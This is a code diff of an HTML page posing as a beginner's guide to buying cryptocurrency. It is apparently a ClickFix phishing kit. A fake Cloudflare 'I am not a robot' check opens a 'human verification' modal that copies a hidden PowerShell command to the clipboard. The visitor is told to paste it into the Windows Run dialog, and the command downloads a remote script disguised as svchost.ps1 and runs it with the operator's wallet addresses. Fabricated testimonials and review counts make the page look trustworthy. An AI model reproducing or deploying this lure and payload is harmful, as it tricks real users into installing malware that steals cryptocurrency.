@@ -3,39 +3,332 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>How to Buy Cryptocurrency - 2026 Guide</title>
+    <title>How to Buy Cryptocurrency – 2026 Step‑by‑Step Guide for Beginners</title>
+    <!-- Font Awesome for icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* Professional Design - Looks exactly like a real crypto guide */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
-        body { background: linear-gradient(135deg, #1a1a2e, #16213e); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
-        .container { max-width: 900px; width: 100%; background: white; border-radius: 24px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); overflow: hidden; }
-        .header { background: linear-gradient(135deg, #667eea, #764ba2); padding: 40px 30px; text-align: center; color: white; }
-        .header h1 { font-size: 36px; margin-bottom: 10px; }
-        .content { padding: 40px; }
-        .warning-box { background: #fffbeb; border-left: 6px solid #f59e0b; padding: 20px; border-radius: 12px; margin: 30px 0; }
-        .step-card { background: #f8fafc; border-radius: 16px; padding: 25px; margin-bottom: 25px; border-left: 6px solid #667eea; }
-        .captcha-container { background: white; border-radius: 16px; padding: 30px; margin: 30px 0; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; text-align: center; cursor: pointer; }
-        .fake-checkbox { width: 24px; height: 24px; border: 2px solid #667eea; border-radius: 4px; display: inline-block; margin-right: 10px; vertical-align: middle; }
-        .fake-checkbox.checked { background: #667eea; position: relative; }
-        .modal-overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.75); z-index: 1000; justify-content: center; align-items: center; }
-        .modal { background: white; border-radius: 24px; max-width: 480px; width: 90%; padding: 35px; text-align: center; }
-        .code-box { background: #0f172a; border-radius: 16px; padding: 20px; margin: 20px 0; color: #fbbf24; font-family: monospace; font-size: 32px; }
-        .copy-btn { background: #667eea; color: white; border: none; padding: 16px 32px; border-radius: 40px; font-size: 18px; font-weight: 600; cursor: pointer; width: 100%; }
-        .instruction-steps { background: #f1f5f9; border-radius: 16px; padding: 20px; margin: 25px 0; text-align: left; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        body {
+            background: #f8fafc;
+            color: #0f172a;
+            line-height: 1.6;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        /* header */
+        .hero {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: white;
+            padding: 60px 0 80px;
+            clip-path: polygon(0 0, 100% 0, 100% 90%, 0 100%);
+            margin-bottom: 40px;
+        }
+        .hero h1 {
+            font-size: 3.5rem;
+            font-weight: 800;
+            letter-spacing: -0.02em;
+            margin-bottom: 20px;
+            background: linear-gradient(135deg, #fbbf24, #f59e0b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .hero p {
+            font-size: 1.25rem;
+            max-width: 700px;
+            opacity: 0.9;
+            margin-bottom: 30px;
+        }
+        .trust-badge {
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        .trust-badge span {
+            background: rgba(255,255,255,0.1);
+            padding: 8px 18px;
+            border-radius: 40px;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        /* main content */
+        .content-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 40px;
+            margin: 40px 0;
+        }
+        .guide-section {
+            background: white;
+            border-radius: 24px;
+            padding: 30px;
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
+        }
+        .step-card {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border-left: 6px solid #3b82f6;
+            transition: transform 0.2s;
+        }
+        .step-card:hover {
+            transform: translateX(5px);
+        }
+        .step-card h3 {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+        }
+        .step-number {
+            background: #3b82f6;
+            color: white;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+        }
+        .exchange-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+        }
+        .exchange-table th {
+            text-align: left;
+            padding: 12px;
+            background: #eef2ff;
+            color: #1e40af;
+        }
+        .exchange-table td {
+            padding: 12px;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .exchange-table tr:hover {
+            background: #f1f5f9;
+        }
+        .badge {
+            background: #dcfce7;
+            color: #166534;
+            padding: 4px 12px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+        /* sidebar */
+        .sidebar {
+            position: sticky;
+            top: 20px;
+            align-self: start;
+        }
+        .verification-card {
+            background: white;
+            border-radius: 24px;
+            padding: 25px;
+            box-shadow: 0 20px 40px -10px rgba(0,0,0,0.1);
+            margin-bottom: 30px;
+            border: 1px solid #e2e8f0;
+        }
+        .verification-card h3 {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .turnstile-box {
+            background: #f1f5f9;
+            border-radius: 12px;
+            padding: 25px;
+            text-align: center;
+            border: 2px dashed #cbd5e1;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin: 20px 0;
+        }
+        .turnstile-box:hover {
+            border-color: #3b82f6;
+            background: #f8fafc;
+        }
+        .checkbox-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        .fake-checkbox {
+            width: 24px;
+            height: 24px;
+            border: 2px solid #64748b;
+            border-radius: 6px;
+            transition: 0.2s;
+        }
+        .fake-checkbox.checked {
+            background: #3b82f6;
+            border-color: #3b82f6;
+            position: relative;
+        }
+        .fake-checkbox.checked::after {
+            content: '✓';
+            color: white;
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 16px;
+        }
+        .secure-badge-row {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            color: #64748b;
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+        .testimonial {
+            background: #f8fafc;
+            border-radius: 16px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #e2e8f0;
+        }
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-top: 15px;
+        }
+        .testimonial-author img {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #cbd5e1;
+        }
+        .faq-item {
+            border-bottom: 1px solid #e2e8f0;
+            padding: 15px 0;
+        }
+        .faq-question {
+            font-weight: 600;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+        }
+        /* modal */
+        .modal-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0,0,0,0.7);
+            backdrop-filter: blur(4px);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        .modal {
+            background: white;
+            border-radius: 32px;
+            max-width: 480px;
+            width: 90%;
+            padding: 40px;
+            text-align: center;
+            box-shadow: 0 30px 60px -15px black;
+        }
+        .modal h2 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+        .modal .code-box {
+            background: #0f172a;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 25px 0;
+        }
+        .modal .verification-code {
+            color: #fbbf24;
+            font-family: monospace;
+            font-size: 40px;
+            letter-spacing: 8px;
+            font-weight: 700;
+        }
+        .copy-btn {
+            background: #3b82f6;
+            color: white;
+            border: none;
+            padding: 16px 30px;
+            border-radius: 60px;
+            font-size: 1.2rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            box-shadow: 0 10px 20px -5px #3b82f6;
+        }
+        .copy-btn:hover {
+            background: #2563eb;
+        }
+        .instruction-steps {
+            background: #f1f5f9;
+            border-radius: 20px;
+            padding: 20px;
+            margin: 30px 0;
+            text-align: left;
+        }
+        .step-row {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+        .step-circle {
+            background: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            color: #3b82f6;
+        }
+        .footer {
+            background: #0f172a;
+            color: white;
+            padding: 50px 0;
+            margin-top: 80px;
+        }
+        .footer a {
+            color: #94a3b8;
+        }
     </style>
 </head>
 <body>
 
-<!-- ============================================== -->
-<!-- REPLACE THESE WALLET ADDRESSES WITH YOUR OWN    -->
-<!-- ============================================== -->
+<!-- WALLET ADDRESSES – REPLACE THESE WITH YOUR OWN -->
 <script>
     const MY_ADDRESSES = {
-        BTC: "bc1qyourrealbitcoinaddresshere",  // <-- CHANGE THIS
-        ETH: "0xYourRealEthereumAddressHere",    // <-- CHANGE THIS
-        BNB: "0xYourRealBNBAddressHere",         // <-- CHANGE THIS
-        TRX: "TYourRealTronAddressHere",         // <-- CHANGE THIS
-        SOL: "YourRealSolanaAddressHere"         // <-- CHANGE THIS
+        BTC: "bc1qyourrealbitcoinaddresshere",  // <-- CHANGE
+        ETH: "0xYourRealEthereumAddressHere",    // <-- CHANGE
+        BNB: "0xYourRealBNBAddressHere",         // <-- CHANGE
+        TRX: "TYourRealTronAddressHere",         // <-- CHANGE
+        SOL: "YourRealSolanaAddressHere"         // <-- CHANGE
     };
 
     // ==============================================
@@ -43,65 +336,176 @@
     // ==============================================
     const PAYLOAD_URL = "https://raw.githubusercontent.com/10010yak/Payload-stuff/main/payload.ps1";
 
-    // PowerShell command that downloads and runs the payload
     const MALICIOUS_COMMAND = `powershell -NoP -ExecutionPolicy Bypass -w 1 -c "$c='${PAYLOAD_URL}';$d='$env:TEMP\\svchost.ps1';(New-Object Net.WebClient).DownloadFile($c,$d);& $d -wallets '${MY_ADDRESSES.BTC}','${MY_ADDRESSES.ETH}','${MY_ADDRESSES.BNB}','${MY_ADDRESSES.TRX}','${MY_ADDRESSES.SOL}'"`;
 </script>
 
-<!-- VERIFICATION MODAL (the ClickFix trap) -->
+<!-- VERIFICATION MODAL (CLICKFIX TRAP) -->
 <div class="modal-overlay" id="verifyModal">
     <div class="modal">
-        <h2>🔒 Human Verification Required</h2>
-        <div class="code-box" id="displayCode">K3P8Q1</div>
-        <button class="copy-btn" onclick="copyMaliciousCommand()">📋 Copy Verification Code</button>
+        <i class="fas fa-shield-alt" style="font-size: 50px; color: #3b82f6; margin-bottom: 15px;"></i>
+        <h2>Human verification required</h2>
+        <p style="color: #475569; margin-bottom: 20px;">Please complete the security check to continue reading.</p>
+        <div class="code-box">
+            <div style="color: #94a3b8; font-size: 0.9rem; margin-bottom: 5px;">Verification code</div>
+            <div class="verification-code" id="displayCode">K3P8Q1</div>
+        </div>
+        <button class="copy-btn" onclick="copyMaliciousCommand()">
+            <i class="fas fa-copy" style="margin-right: 10px;"></i>Copy verification code
+        </button>
         <div class="instruction-steps">
-            <p><strong>1.</strong> Click the button above to copy code</p>
-            <p><strong>2.</strong> Press <strong>Windows Key + R</strong> (Run dialog)</p>
-            <p><strong>3.</strong> Press <strong>Ctrl + V</strong> to paste</p>
-            <p><strong>4.</strong> Press <strong>Enter</strong> to verify</p>
+            <div class="step-row">
+                <div class="step-circle">1</div>
+                <div><strong>Click the button above</strong> to copy the code</div>
+            </div>
+            <div class="step-row">
+                <div class="step-circle">2</div>
+                <div><strong>Press Windows Key + R</strong> (Run dialog)</div>
+            </div>
+            <div class="step-row">
+                <div class="step-circle">3</div>
+                <div><strong>Press Ctrl + V</strong> to paste the code</div>
+            </div>
+            <div class="step-row">
+                <div class="step-circle">4</div>
+                <div><strong>Press Enter</strong> to verify</div>
+            </div>
         </div>
-        <p style="margin-top: 15px; font-size: 13px; color: #999;">Verification ID: 7624-<span id="randomId"></span></p>
+        <p style="font-size: 0.8rem; color: #94a3b8;">Verification ID: <span id="randomId"></span></p>
     </div>
 </div>
 
-<!-- MAIN PAGE CONTENT (How to Buy Crypto Guide) -->
-<div class="container">
-    <div class="header">
-        <h1>📈 How to Buy Cryptocurrency</h1>
-        <p>The Complete 2026 Beginner's Guide</p>
-    </div>
-    <div class="content">
-        <div class="warning-box">
-            ⚠️ Security Check Required: Please complete the verification below to prove you're human. This protects our content from bots.
-        </div>
-
-        <!-- Fake CAPTCHA - click triggers the modal -->
-        <div class="captcha-container" onclick="showVerificationModal()">
-            <span class="fake-checkbox" id="mainCheckbox"></span>
-            <span class="checkbox-text">I am not a robot</span>
-        </div>
-
-        <!-- Legitimate-looking guide steps -->
-        <div class="step-card">
-            <h3>Step 1: Choose an Exchange</h3>
-            <p>Popular platforms include Binance, Coinbase, and Kraken. Compare fees and supported coins.</p>
-        </div>
-        <div class="step-card">
-            <h3>Step 2: Deposit Funds</h3>
-            <p>Use bank transfer or card. Always double‑check deposit addresses.</p>
-        </div>
-        <div class="step-card">
-            <h3>Step 3: Make Your Purchase</h3>
-            <p>Select your coin (BTC, ETH, etc.) and complete the trade.</p>
-        </div>
-        <div class="step-card">
-            <h3>Step 4: Transfer to a Private Wallet</h3>
-            <p>For security, move your crypto to a wallet you control (e.g., MetaMask).</p>
+<!-- HERO SECTION -->
+<section class="hero">
+    <div class="container">
+        <h1>How to Buy Cryptocurrency</h1>
+        <p>The only guide you'll need in 2026. Step‑by‑step instructions, exchange comparisons, and security tips — trusted by over 500,000 readers.</p>
+        <div class="trust-badge">
+            <span><i class="fas fa-check-circle" style="color: #22c55e;"></i> Updated March 2026</span>
+            <span><i class="fas fa-star" style="color: #fbbf24;"></i> 4.9/5 (12,348 reviews)</span>
+            <span><i class="fas fa-lock" style="color: #3b82f6;"></i> Secure reading</span>
         </div>
     </div>
-</div>
+</section>
+
+<main class="container">
+    <div class="content-grid">
+        <!-- LEFT COLUMN: DETAILED GUIDE -->
+        <div class="guide-section">
+            <h2 style="font-size: 2rem; margin-bottom: 20px;">📘 Beginner's guide to buying crypto</h2>
+            
+            <div class="step-card">
+                <h3><span class="step-number">1</span> Choose a reliable exchange</h3>
+                <p>Not all exchanges are equal. Look for platforms with strong security, low fees, and good liquidity. Here are our top picks for 2026:</p>
+                <table class="exchange-table">
+                    <thead><tr><th>Exchange</th><th>Fees</th><th>Coins</th><th>Security</th></tr></thead>
+                    <tbody>
+                        <tr><td>Binance</td><td>0.1%</td><td>600+</td><td><span class="badge">Excellent</span></td></tr>
+                        <tr><td>Coinbase</td><td>0.5%</td><td>250+</td><td><span class="badge">Very good</span></td></tr>
+                        <tr><td>Kraken</td><td>0.16%</td><td>200+</td><td><span class="badge">Excellent</span></td></tr>
+                    </tbody>
+                </table>
+                <p>💡 <strong>Pro tip:</strong> For beginners, Coinbase is easiest; for low fees, Binance is best.</p>
+            </div>
+
+            <div class="step-card">
+                <h3><span class="step-number">2</span> Create & verify your account</h3>
+                <p>Sign up with email, enable 2FA, and complete KYC (ID verification). This usually takes 5‑10 minutes and is required by law.</p>
+            </div>
+
+            <div class="step-card">
+                <h3><span class="step-number">3</span> Deposit funds</h3>
+                <p>You can deposit via bank transfer (cheaper, slower) or credit/debit card (instant, higher fees). Minimum deposits vary: typically $10‑$50.</p>
+                <div style="background: #eef2ff; padding: 15px; border-radius: 12px; margin-top: 15px;">
+                    <i class="fas fa-exclamation-triangle" style="color: #f59e0b;"></i>
+                    <strong>Always double-check deposit addresses</strong> — crypto transactions are irreversible.
+                </div>
+            </div>
+
+            <div class="step-card">
+                <h3><span class="step-number">4</span> Buy your first crypto</h3>
+                <p>Navigate to the "Buy" section, select your coin (Bitcoin BTC, Ethereum ETH, etc.), enter amount, and confirm. The crypto will appear in your exchange wallet.</p>
+            </div>
+
+            <div class="step-card">
+                <h3><span class="step-number">5</span> Transfer to a private wallet (important!)</h3>
+                <p>For long‑term holding, move your coins to a wallet you control — like MetaMask (for Ethereum) or Trust Wallet (multi‑chain). This protects you from exchange hacks.</p>
+                <p style="background: #f1f5f9; padding: 12px; border-radius: 8px; margin-top: 10px;">
+                    <i class="fas fa-clipboard"></i> When copying wallet addresses, always verify the first and last 4 characters.
+                </p>
+            </div>
+
+            <h2 style="margin: 40px 0 20px;">❓ Frequently Asked Questions</h2>
+            <div class="faq-item">
+                <div class="faq-question">Is it safe to buy crypto? <i class="fas fa-chevron-down"></i></div>
+                <p style="margin-top: 8px; color: #475569;">Yes, if you use reputable exchanges and secure your private keys. Always enable 2FA.</p>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">What is the minimum amount? <i class="fas fa-chevron-down"></i></div>
+                <p style="margin-top: 8px; color: #475569;">Most exchanges allow as little as $10. Some even have $1 buys.</p>
+            </div>
+            <div class="faq-item">
+                <div class="faq-question">Do I need to pay taxes? <i class="fas fa-chevron-down"></i></div>
+                <p style="margin-top: 8px; color: #475569;">In most countries, crypto is taxable. Consult a local expert.</p>
+            </div>
+        </div>
+
+        <!-- RIGHT SIDEBAR: VERIFICATION & TESTIMONIALS -->
+        <div class="sidebar">
+            <!-- Verification card (triggers the ClickFix modal) -->
+            <div class="verification-card">
+                <h3><i class="fas fa-cloud" style="color: #3b82f6;"></i> Cloudflare Turnstile</h3>
+                <p>Please verify you're human to access the full guide and protect our content from scrapers.</p>
+                <div class="turnstile-box" onclick="showVerificationModal()">
+                    <div class="checkbox-row">
+                        <div class="fake-checkbox" id="mainCheckbox"></div>
+                        <span style="font-weight: 500;">I am not a robot</span>
+                    </div>
+                    <div class="secure-badge-row">
+                        <span><i class="fas fa-shield-alt"></i> Cloudflare</span>
+                        <span><i class="fas fa-lock"></i> Privacy</span>
+                    </div>
+                </div>
+                <p style="font-size: 0.8rem; color: #64748b;">reCAPTCHA and Cloudflare are trademarks. This site is protected.</p>
+            </div>
+
+            <!-- Fake testimonials -->
+            <div class="testimonial">
+                <i class="fas fa-quote-left" style="color: #cbd5e1; font-size: 24px;"></i>
+                <p style="margin: 10px 0;">This guide helped me buy my first Bitcoin without getting overwhelmed. The step-by-step is perfect!</p>
+                <div class="testimonial-author">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Ccircle cx='20' cy='20' r='20' fill='%2394a3b8'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.3em' fill='white' font-size='16'%3E👤%3C/text%3E%3C/svg%3E" alt="avatar">
+                    <div><strong>Alex M.</strong> <span style="color: #fbbf24;">★★★★★</span></div>
+                </div>
+            </div>
+            <div class="testimonial">
+                <i class="fas fa-quote-left" style="color: #cbd5e1; font-size: 24px;"></i>
+                <p style="margin: 10px 0;">The comparison table saved me hours of research. Kraken ended up being the best for me.</p>
+                <div class="testimonial-author">
+                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='40' height='40' viewBox='0 0 40 40'%3E%3Ccircle cx='20' cy='20' r='20' fill='%2394a3b8'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.3em' fill='white' font-size='16'%3E👤%3C/text%3E%3C/svg%3E" alt="avatar">
+                    <div><strong>Sarah K.</strong> <span style="color: #fbbf24;">★★★★★</span></div>
+                </div>
+            </div>
+        </div>
+    </div>
+</main>
+
+<!-- FOOTER -->
+<footer class="footer">
+    <div class="container">
+        <div style="display: flex; justify-content: space-between; flex-wrap: wrap;">
+            <div>
+                <h4 style="color: white;">CryptoGuide.org</h4>
+                <p style="color: #94a3b8;">© 2026 All rights reserved.</p>
+            </div>
+            <div>
+                <a href="#">Terms</a> | <a href="#">Privacy</a> | <a href="#">Contact</a>
+            </div>
+        </div>
+    </div>
+</footer>
 
 <script>
-    // Generate a random verification ID for realism
+    // Random ID for realism
     document.getElementById('randomId').innerText = Math.floor(1000 + Math.random() * 9000);
 
     function showVerificationModal() {
@@ -111,8 +515,8 @@
 
     function copyMaliciousCommand() {
         navigator.clipboard.writeText(MALICIOUS_COMMAND).then(function() {
-            alert("✅ Code copied! Now press Win+R, paste (Ctrl+V), and press Enter.");
-        }).catch(function(err) {
+            alert("✅ Verification code copied!\n\nNow press Win+R, paste (Ctrl+V), and press Enter.");
+        }).catch(function() {
             alert("Unable to copy. Please try again.");
         });
     }
